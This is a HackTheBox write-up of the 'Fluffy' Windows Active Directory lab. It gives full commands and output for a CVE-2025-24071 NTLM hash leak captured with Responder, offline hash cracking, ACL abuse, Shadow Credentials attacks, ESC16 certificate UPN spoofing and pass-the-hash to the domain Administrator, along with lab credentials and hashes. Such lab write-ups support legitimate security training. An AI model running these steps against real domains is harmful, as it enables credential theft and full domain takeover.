# Fluffy — HackTheBox Writeup

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Fluffy)  
**Difficulty:** `Easy`  
**OS:** `Windows`  
**Author:** samurai

> **Starting credentials provided:** `j.fleischman` / `J0elTHEM4n1990!`

---

## Overview

Fluffy is an Easy-rated Windows Active Directory machine. Beginning with provided low-privilege domain credentials, enumeration of an IT SMB share reveals an `Upgrade_Notice.pdf` that references known CVEs. One of these — CVE-2025-24071, a Windows File Explorer NTLM hash leak — is exploited by planting a malicious `.library-ms` file on the writable share, capturing the NTLMv2 hash of `p.agila` via Responder. BloodHound analysis then reveals a privilege chain: `p.agila` is a member of `Service Accounts Managers`, which holds `GenericAll` over the `Service Accounts` group, which in turn has `GenericWrite` over `winrm_svc`. This ACE chain is abused using a **Shadow Credentials** attack to retrieve the NT hash of `winrm_svc` and obtain an initial shell. From there, the same Shadow Credentials technique is applied to `ca_svc` — a member of `Service Accounts` with Certificate Authority access. The CA is found to be vulnerable to **ESC16**, allowing UPN spoofing to obtain an Administrator certificate and recover the domain Administrator's NT hash.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Foothold — CVE-2025-24071 (NTLM Hash Leak)](#initial-foothold)
4. [Lateral Movement — Shadow Credentials → winrm_svc](#lateral-movement)
5. [Privilege Escalation — ESC16 via ca_svc](#privilege-escalation)

---

## Reconnaissance

Port scanning was performed using RustScan for rapid discovery, followed by a targeted Nmap service scan:

```bash
rustscan -a 10.129.232.88 --ulimit 5000
nmap -A -p53,88,139,389,445,464,593,636,3268,3269,5985,9389 10.129.232.88
```

The port profile is consistent with a Windows Domain Controller:

```
PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos
139/tcp   open   netbios-ssn
389/tcp   open   ldap          Microsoft Windows AD LDAP (Domain: fluffy.htb)
445/tcp   open   microsoft-ds
464/tcp   open   kpasswd5
593/tcp   open   ncacn_http    RPC over HTTP 1.0
636/tcp   open   ssl/ldap      Microsoft Windows AD LDAP
3268/tcp  open   ldap          Global Catalog
3269/tcp  open   ssl/ldap      Global Catalog TLS
5985/tcp  open   http          WinRM (Microsoft HTTPAPI 2.0)
9389/tcp  open   adws
```

**Key observations:**

- Hostname: `DC01.fluffy.htb` — primary Domain Controller
- OS: Windows Server 2019 (Build 17763)
- SMB signing is **required** — NTLM relay attacks are not viable
- WinRM (port 5985) is open — accessible via `evil-winrm` with valid credentials

### Open Ports Summary

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | AD-integrated DNS |
| 88/tcp | Kerberos | Authentication — AS-REP/Kerberoasting target |
| 389/tcp | LDAP | User/group/SPN enumeration |
| 636/tcp | LDAPS | TLS-wrapped LDAP |
| 3268/tcp | Global Catalog | Forest-wide queries |
| 445/tcp | SMB | Signing required — relay blocked |
| 5985/tcp | WinRM | PowerShell remoting |

---

## Enumeration

### SMB Share Enumeration

Anonymous access was denied. Enumeration with the provided credentials revealed an unusual non-default share:

```bash
netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

```
Share        Permissions    Remark
-----        -----------    ------
ADMIN$                      Remote Admin
C$                          Default share
IPC$         READ           Remote IPC
IT           READ,WRITE
NETLOGON     READ           Logon server share
SYSVOL       READ           Logon server share
```

The `IT` share is both readable and writable — this is significant for later exploitation.

### IT Share Contents

The share was browsed and all contents downloaded:

```bash
smbclient //10.129.232.88/IT -U 'j.fleischman%J0elTHEM4n1990!'
smb: \> RECURSE on
smb: \> PROMPT off
smb: \> mget *
```

**Files retrieved:**

| File | Notes |
|------|-------|
| `Upgrade_Notice.pdf` | Contains a list of CVEs and patch advisories |
| `KeePass-2.58.zip` | KeePass password manager installer |
| `Everything-1.4.1.1026.x64.zip` | Everything search tool installer |

### CVE-2025-24071 Identified

Reviewing `Upgrade_Notice.pdf` revealed a list of CVEs flagged for patching. Research into the listed entries identified **CVE-2025-24071** as directly exploitable in this environment.

**CVE-2025-24071 — Windows File Explorer NTLMv2 Hash Leak**

This vulnerability affects Windows File Explorer's handling of `.library-ms` files. When a malicious `.library-ms` file referencing a remote SMB share is extracted from a ZIP archive, Windows File Explorer automatically attempts to resolve the embedded UNC path, triggering an outbound NTLM authentication to the attacker's host — leaking the victim user's NTLMv2 hash without any user interaction beyond extracting the archive. A public exploit is available at [Exploit-DB #52310](https://www.exploit-db.com/exploits/52310).

---

## Initial Foothold

### CVE-2025-24071 — Capturing p.agila's NTLMv2 Hash

**Step 1 — Generate the malicious ZIP:**

```bash
python3 exploit.py -i 10.10.14.88
# [+] Created ZIP: output/malicious.zip
# [!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
```

**Step 2 — Start Responder to capture inbound NTLM authentication:**

```bash
sudo responder -I tun0
```

> **Important:** Responder must be running *before* uploading the file, as hash capture occurs the moment an authenticated user's Explorer processes the share.

**Step 3 — Upload the malicious ZIP to the writable IT share:**

```bash
smbclient //10.129.232.88/IT -U 'j.fleischman%J0elTHEM4n1990!'
smb: \> put malicious.zip
```

**Step 4 — Hash captured:**

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:4f2c345edde92d71:066F4847FF8EEAF5...
```

**Step 5 — Crack the hash offline:**

```bash
john ntlm_hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

```
prometheusx-303  (p.agila)
```

Credentials obtained: `p.agila` / `prometheusx-303`

Direct WinRM access as `p.agila` was denied. BloodHound enumeration was performed to identify privilege escalation paths.

---

## Lateral Movement

### ACE Chain Discovery (BloodHound)

BloodHound analysis of `p.agila`'s relationships revealed the following privilege chain:

```
p.agila
  └─► Member of: Service Accounts Managers
          └─► GenericAll on: Service Accounts (group)
                  └─► GenericWrite on: winrm_svc (user)
```

`GenericWrite` over a user account enables a **Shadow Credentials** attack — injecting a Key Credential into the target's `msDS-KeyCredentialLink` attribute, then authenticating as that user via certificate-based PKCE to retrieve their NT hash.

### Kerberoasting Attempt (Dead End)

Before Shadow Credentials, Kerberoasting was attempted against `winrm_svc` (which has a registered SPN). Clock synchronisation with the DC was required first:

```bash
sudo ntpdate 10.129.232.88
impacket-GetUserSPNs -dc-ip 10.129.232.88 fluffy.htb/p.agila:'prometheusx-303' -request-user winrm_svc
```

A TGS hash was obtained but could not be cracked offline. The attack path was pivoted to Shadow Credentials instead.

### Step 1 — Add p.agila to Service Accounts Group

Using `p.agila`'s `GenericAll` rights over the `Service Accounts` group (via `Service Accounts Managers`):

```bash
bloodyAD --host dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb \
  add groupMember 'service accounts' p.agila
# [+] p.agila added to service accounts
```

This grants `p.agila` the `GenericWrite` rights over `winrm_svc` that belong to the `Service Accounts` group.

### Step 2 — Shadow Credentials Attack on winrm_svc

```bash
certipy-ad shadow auto \
  -username p.agila@fluffy.htb \
  -password 'prometheusx-303' \
  -account winrm_svc \
  -dc-ip 10.129.232.88 \
  -target 10.129.232.88
```

```
[*] Successfully added Key Credential to 'winrm_svc'
[*] Got TGT
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
[*] Restored old Key Credentials for 'winrm_svc'
```

### Step 3 — WinRM Access and User Flag

```bash
evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

```
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
bce036962d801632d1eee3470813dd65
```

**User flag captured.**

---

## Privilege Escalation

### ca_svc — Certificate Authority Service Account

Further enumeration revealed a service account `ca_svc` that is a member of the `Service Accounts` group — meaning `p.agila` (now also a member) has `GenericWrite` over it as well. Additionally, `ca_svc` has access to the domain's Certificate Authority.

### Step 1 — Shadow Credentials Attack on ca_svc

```bash
certipy-ad shadow auto \
  -username p.agila \
  -password 'prometheusx-303' \
  -dc-ip 10.129.232.88 \
  -target 10.129.232.88 \
  -account ca_svc
```

```
[*] Successfully added Key Credential to 'ca_svc'
[*] Got TGT
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
[*] Restored old Key Credentials for 'ca_svc'
```

### Step 2 — Certificate Authority Enumeration (ESC16)

With `ca_svc`'s hash, Certipy was used to audit the Certificate Authority for vulnerable configurations:

```bash
certipy-ad find \
  -username 'ca_svc@fluffy.htb' \
  -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' \
  -dc-ip 10.129.232.88 \
  -vulnerable
```

**Finding — ESC16:**

```
CA Name     : fluffy-DC01-CA
[!] Vulnerabilities
    ESC16   : Security Extension is disabled.
```

**ESC16 — CA-Wide Security Extension Removal**

ESC16 occurs when the CA's `EditFlags` are configured to omit the `szOID_NTDS_CA_SECURITY_EXT` extension (OID `1.3.6.1.4.1.311.25.2`) from every issued certificate. Without this extension, certificates no longer embed the requesting account's SID, breaking the strong certificate-to-account binding introduced in Windows Server 2022 (KB5014754). This means any certificate issued by the CA can be used to authenticate as an arbitrary UPN — including `administrator` — since there is no SID-based binding to verify the true owner.

**Difference from ESC9:** ESC9 affects individual misconfigured templates; ESC16 affects the CA globally, making every template with a Client Authentication EKU exploitable.

### Step 3 — UPN Spoofing: Set ca_svc UPN to "administrator"

```bash
certipy-ad account update \
  -username 'ca_svc@fluffy.htb' \
  -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' \
  -user 'ca_svc' \
  -upn administrator \
  -dc-ip 10.129.232.88
# [*] Successfully updated 'ca_svc' — userPrincipalName: administrator
```

### Step 4 — Request a Certificate as "administrator"

```bash
certipy-ad req \
  -u 'ca_svc@fluffy.htb' \
  -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
  -dc-ip 10.129.232.88 \
  -target dc01.fluffy.htb \
  -ca 'fluffy-DC01-CA' \
  -template 'User'
```

```
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

### Step 5 — Restore ca_svc UPN (Critical Cleanup Step)

The UPN must be restored to its original value *before* authenticating, otherwise the DC cannot map the certificate UPN to the correct account:

```bash
certipy-ad account update \
  -username 'ca_svc@fluffy.htb' \
  -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' \
  -user 'ca_svc' \
  -upn 'ca_svc@fluffy.htb' \
  -dc-ip 10.129.232.88
# [*] Successfully updated 'ca_svc' — userPrincipalName: ca_svc@fluffy.htb
```

> **Note:** Authenticating while the UPN is still set to `administrator` will result in a "Name mismatch" error. The UPN must be restored first.

### Step 6 — Authenticate and Retrieve Administrator NT Hash

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.129.232.88 \
  -domain fluffy.htb
```

```
[*] Using principal: 'administrator@fluffy.htb'
[*] Got TGT
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

### Step 7 — Pass-the-Hash as Administrator

```bash
evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
343d974bdae1da36110bdef7890fd21c
```

**Root flag captured.**

---

## Attack Chain Summary

```
Provided credentials: j.fleischman / J0elTHEM4n1990!
    └─► IT share (READ/WRITE) → Upgrade_Notice.pdf → CVE-2025-24071
            └─► Malicious .library-ms in ZIP → Responder captures NTLMv2
                    └─► Hash cracked → p.agila / prometheusx-303
                            └─► BloodHound: Service Accounts Managers
                                    → GenericAll on Service Accounts
                                        → GenericWrite on winrm_svc
                                            └─► p.agila added to Service Accounts
                                                    └─► Shadow Credentials → winrm_svc NT hash
                                                            └─► evil-winrm → user.txt
                                                                    └─► ca_svc ∈ Service Accounts
                                                                            └─► Shadow Credentials → ca_svc NT hash
                                                                                    └─► Certipy: ESC16 on fluffy-DC01-CA
                                                                                            └─► UPN spoof → administrator cert
                                                                                                    └─► Administrator NT hash
                                                                                                            └─► evil-winrm → root.txt
```

---

## Techniques & Tools Referenced

| Technique / Tool | Purpose |
|------------------|---------|
| NetExec | SMB share enumeration and credential validation |
| Responder | NTLMv2 hash capture via forced SMB authentication |
| CVE-2025-24071 | Windows File Explorer `.library-ms` NTLM hash leak |
| John the Ripper | NTLMv2 hash cracking |
| BloodHound | AD ACE chain discovery |
| BloodyAD | Group membership manipulation |
| impacket-GetUserSPNs | Kerberoasting |
| Certipy `shadow auto` | Shadow Credentials attack — NT hash retrieval via Key Credential injection |
| Certipy `find` | Certificate Authority vulnerability enumeration |
| ESC16 | CA-wide security extension removal — UPN spoofing for arbitrary certificate authentication |
| Evil-WinRM | Pass-the-Hash WinRM shell |

---

## Key Takeaways

- Writable SMB shares are a high-risk misconfiguration in AD environments — they enable file-based attacks that require zero user interaction beyond routine file-system activity (extracting a ZIP).
- CVE-2025-24071 demonstrates that even benign-seeming file types (`.library-ms`) can be weaponised to leak credentials silently.
- BloodHound is essential for identifying non-obvious ACE chains. `GenericAll` on a group combined with `GenericWrite` on a user creates a full Shadow Credentials attack path.
- The ESC16 UPN restore step is a critical operational detail — authenticating before restoring the UPN will fail. Always restore the spoofed UPN immediately after certificate issuance and before authentication.
- Shadow Credentials attacks are self-cleaning (`certipy shadow auto` restores the original `msDS-KeyCredentialLink`), making them operationally cleaner than password-modification attacks.
